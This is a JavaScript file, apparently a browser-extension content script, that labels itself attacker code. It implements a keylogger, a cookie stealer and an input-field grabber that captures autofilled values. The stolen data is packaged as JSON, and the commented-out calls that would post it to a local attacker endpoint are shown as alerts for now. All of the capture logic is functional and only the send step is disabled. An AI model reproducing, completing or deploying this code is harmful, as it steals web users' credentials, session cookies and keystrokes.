/* attacker pseudo-database / server */
var host_url = "http://127.0.0.1:41775/"

/* Get stored UUID */
// var clientID;
// chrome.storage.local.get(['id'],function(result){
//     if (result) { 
//         clientID = result; 
//     } else {

//     };
// });


// function getClientID() {
//     var get = new XMLHttpRequest();
//     get.open("GET",url+'create');
// }


// function PostTo(endpoint,request) {
//     var cur = new XMLHttpRequest();
//     cur.open("POST",url+endpoint);
//     cur.setRequestHeader("Content-Type","application/json");
//     cur.send(JSON.stringify(request));
// }

/* Timestamp Strings */
function createTimestamp() {
    var now = new Date();
    return now.getDate()+'-'+(now.getMonth()+1)+'-'+now.getFullYear()+' '+now.getHours()+':'+now.getMinutes()+':'+now.getSeconds();
}


/* ## Page Ready Event  ## */

document.addEventListener('readystatechange',event => {
    /* Wait for the page to be fully loaded */
    if (event.target.readyState === "complete") {
        getInputFields();
        saveAndSendC(); 
    }
})


/* ## Cookies ## */

function saveAndSendC() {
    /* If the site doesn't use cookies, but we know that's impossible */
    if (!document.cookie) { return; }
    /* output JSON */
    var curCookies = {}
    curCookies['timestamp'] = createTimestamp();
    curCookies['url'] = document.URL;
    curCookies['title'] = document.title;
    curCookies['cookies'] = document.cookie;
    alert(JSON.stringify(curCookies));
    // PostTo('add/cookies',curCookies);
}





/* ## Input Field Grabber - will catch autofill thanks to the caller event ## */

function getInputFields() {
    allInputs = document.getElementsByTagName('input');
    for (var i = 0; i < allInputs.length; i++) {
        /* When a field loses focus for the first time, save and send to catch autofilled fields */
        allInputs[i].addEventListener('blur',function(e) {
            saveAndSendIF(e.target);
        },{once:true});
    }
}


/* Sends to an input field only endpoint */
function saveAndSendIF(target) {
    if (!target.value) { return; }
    /* output JSON */
    var curInput = {} 
    curInput['timestamp'] = createTimestamp();
    curInput['url'] = document.URL;
    curInput['title'] = document.title;
    curInput['type'] = target.name;
    curInput['content'] = target.value;
    /* Send to remote server */
    alert(JSON.stringify(curInput)); // placeholder
    // PostTo('add/input',curInput);
}





/* ## Keylogger ## */

/* Temporary array of keypresses for the current page / form, reset and sent whenever we assume the user is done with a given input  */
var curlog = [];

/* On keydown event, log the keystroke */
document.addEventListener('keydown',function(e) {
    /* Some browsers won't give this listener the actual event, so we get it using a legacy feature */
    e = e || window.event;
    var curChar = e.key
    if (curChar) {
        /* If we get a Shift keypress, capitalise the next letter instead */
        if (curlog[curlog.length - 1] === 'Shift' && curChar.length === 1) {
            curlog[curlog.length - 1] = curChar.toLocaleUpperCase();
        /* Else just add the letter to the log */
        } else {
            curlog.push(curChar);
        }
        
        /* If it's any of these, the user is done with this input box and we can send */
        if (curChar == "Tab") {
            saveAndSendKS();
        }
        if (curChar == "Enter") {
            saveAndSendKS();
        }
    }
});

/* On click event, save and send the current log */
document.addEventListener('mousedown',function() {
    saveAndSendKS();
});

/* Send user input before user leaves webpage or close tab/window*/
window.onbeforeunload = function() {
    saveAndSendKS();
}

/* Construct a JSON to send, clear the log for the next input box */
function saveAndSendKS() {
    if (curlog.length === 0) { return; }
    /* output JSON */
    var curMessage = {} 
    curMessage['timestamp'] = createTimestamp();
    curMessage['url'] = document.URL;
    curMessage['title'] = document.title;
    /* Set and clear log */
    curMessage['content'] = curlog;
    curlog = [];
    /* Send to remote server */
    alert(JSON.stringify(curMessage)); // placeholder
    // PostTo('add/keystrokes',curMessage);

}